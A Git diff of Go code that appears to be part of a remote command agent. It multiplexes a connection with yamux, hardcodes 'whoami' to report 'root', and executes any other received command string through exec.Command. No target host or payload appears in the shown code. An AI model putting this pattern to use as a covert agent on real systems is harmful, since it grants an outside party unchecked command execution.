@@ -10,6 +10,7 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strings"
 	"time"
 
 	"github.com/hashicorp/yamux"
@@ -23,7 +24,8 @@ func hello() string {
 }
 
 func doCommand(command string) string {
-	cmd, err := exec.Command(command).Output()
+	split_command := strings.SplitN(command, " ", 3)
+	cmd, err := exec.Command(split_command[0], split_command[1:]...).Output()
 	if err != nil {
 		fmt.Println(err.Error())
 		return err.Error()
@@ -37,6 +39,8 @@ func commands_parser(command string) string {
 		return hello()
 	case "whoami":
 		return "root"
+	case "interract":
+		return ""
 	default:
 		return doCommand(command)
 	}
